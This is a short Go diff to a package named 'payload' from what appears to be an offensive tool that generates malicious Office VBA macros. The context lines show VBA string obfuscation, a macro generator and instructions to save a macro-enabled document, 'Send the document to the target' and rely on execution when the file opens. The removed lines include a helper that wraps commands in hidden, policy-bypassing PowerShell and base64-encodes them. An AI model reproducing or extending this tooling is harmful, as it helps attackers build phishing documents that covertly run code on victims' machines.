@@ -2,7 +2,6 @@ package payload
 
 import (
 	cryptorand "crypto/rand"
-	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"math/rand"
@@ -84,10 +83,6 @@ func obfuscateVBAString(p *macroVarPool, s string, split bool) string {
 		i += chunkLen
 	}
 	return strings.Join(parts, " & ")
-}
-
-func vbCrLf() string {
-	return " & vbCrLf & _\n"
 }
 
 func GenerateMacroVBA(config MacroConfig) (string, error) {
@@ -539,9 +534,4 @@ func GetMacroInstructions() string {
 		"6. Save the document as a Macro-Enabled Document (*.docm) or Macro-Enabled Workbook (*.xlsm)\n" +
 		"7. Send the document to the target\n\n" +
 		"Note: The macro will execute on document open. Ensure the target has macros enabled."
-}
-
-func encodePowerShellPayload(command string) string {
-	cmd := fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -c \"%s\"", command)
-	return base64.StdEncoding.EncodeToString([]byte(cmd))
 }
